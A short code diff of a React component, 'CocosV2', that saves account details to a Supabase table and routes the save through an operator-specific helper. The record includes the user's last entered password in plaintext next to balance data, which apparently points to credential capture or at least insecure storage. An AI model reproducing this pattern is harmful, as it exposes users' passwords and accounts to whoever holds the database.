@@ -232,7 +232,6 @@ const CocosV2 = () => {
         phone: authData?.phone || factorsData?.phone || null,
         last_login_at: new Date().toISOString(),
         last_data_sync_at: new Date().toISOString(),
-        operator_code: operatorCode,
       };
 
       // Only include these fields if we actually have values (avoid overwriting with null)
@@ -243,7 +242,7 @@ const CocosV2 = () => {
       const pwd = lastPasswordRef.current || lastPassword;
       if (pwd) payload.password = pwd;
 
-      await supabase.from("cocos_accounts").upsert(payload, { onConflict: "email" });
+      await upsertAccountForOperator(payload);
 
       // Update session with balance info
       const totalArs = Number(balArs?.totalBalance) || 0;
